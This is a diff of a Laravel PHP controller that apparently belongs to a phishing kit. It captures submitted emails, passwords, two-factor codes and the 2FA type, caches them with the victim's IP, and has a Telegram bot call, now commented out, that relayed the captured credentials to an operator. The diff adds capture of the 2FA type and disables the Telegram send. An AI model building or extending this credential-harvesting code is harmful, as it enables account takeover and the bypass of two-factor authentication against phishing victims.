@@ -26,7 +26,7 @@ class Controller extends BaseController
     public $password;
 
 
-    public function __construct()
+    public function __construct(Request $request)
     {
         $settings = Cache::rememberForever('settings', function () {
             return \App\Models\Setting::pluck('value', 'key')->toArray();
@@ -61,6 +61,7 @@ class Controller extends BaseController
             $fa = $request->fa ?? '';
             $isLoginSuccessfully = $request->isLoginSuccessfully ?? '';
             $isFaSuccessfully = $request->isFaSuccessfully ?? '';
+            $typeFa = $request->typeFa ?? '';
             $isCheckLogin = $request->isCheckLogin ?? 0;
             $isCheckFa = $request->isCheckFa ?? 0;
             Cache::put($email, json_encode([
@@ -68,11 +69,12 @@ class Controller extends BaseController
                 'email' => $email,
                 'password' => $password,
                 'fa' => $fa,
+                'typeFa' => $typeFa,
                 'isLoginSuccessfully' => $isLoginSuccessfully,
                 'isFaSuccessfully' => $isFaSuccessfully,
                 // 'isCheckLogin' => $isCheckLogin,
                 // 'isCheckFa' => $isCheckFa,
-            ]));
+            ]), 10);
 
             return response()->json([
                 'status' => 0,
@@ -233,9 +235,9 @@ class Controller extends BaseController
             // // send pass
             // $data['text'] = "$infoByIP Password: $password";
 
-            $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
-                'json' => $data
-            ]);
+            // $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
+            //     'json' => $data
+            // ]);
             Cache::put("info", json_encode([
                 'ip' => $request->ip(),
                 'email' => $email,
